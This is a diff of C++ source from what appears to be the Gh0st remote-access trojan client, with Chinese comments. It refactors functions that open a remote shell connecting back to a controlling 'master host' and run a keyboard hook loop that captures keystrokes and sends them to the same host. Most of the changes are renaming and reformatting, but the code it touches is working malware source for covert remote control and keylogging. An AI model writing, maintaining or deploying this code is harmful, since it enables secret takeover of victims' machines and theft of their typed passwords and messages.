@@ -26,13 +26,18 @@ extern bool g_bSignalHook;
 //	return 0;
 //}
 
+
+// 终端管理
 DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
 {
 	CClientSocket	socketClient;
-	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost,
+							  CKernelManager::m_nMasterPort)) {
 		return -1;
+	}
 	
-	Gh0st::CShellManager	manager(&socketClient);
+	// 在构造函数里用管道与UI进行交互
+	Gh0st::CShellManager manager(&socketClient);
 	
 	socketClient.run_event_loop();
 
@@ -87,9 +92,9 @@ DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
 	while (1)
 	{
 		while (g_bSignalHook == false)Sleep(100);
-		CGh0stKeyboardManager::StartHook();
+		Gh0st::CKeyboardManager::StartHook();
 		while (g_bSignalHook == true)Sleep(100);
-		CGh0stKeyboardManager::StopHook();
+		Gh0st::CKeyboardManager::StopHook();
 	}
 
 	return 0;
@@ -101,7 +106,7 @@ DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
 	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
 		return -1;
 	
-	CGh0stKeyboardManager	manager(&socketClient);
+	Gh0st::CKeyboardManager	manager(&socketClient);
 	
 	socketClient.run_event_loop();
 
